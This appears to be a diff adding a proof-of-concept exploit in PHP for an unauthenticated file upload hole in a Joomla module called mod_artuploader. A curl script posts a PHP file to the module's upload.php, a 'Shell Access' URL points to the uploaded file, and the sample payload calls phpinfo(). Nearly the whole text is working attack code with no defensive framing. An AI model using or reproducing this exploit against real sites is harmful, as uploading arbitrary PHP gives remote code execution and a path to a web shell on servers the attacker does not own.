@@ -1,0 +1,22 @@
+<?php
+
+$uploadfile="lo.php";
+$ch = 
+curl_init("http://www.example.com/modules/mod_artuploader/upload.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+         array('userfile'=>"@$uploadfile",
+                'path'=>'./'));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+Shell Access : http://www.example.com/modules/mod_artuploader/lo.php
+
+lo.php
+<?php
+phpinfo();
+?>
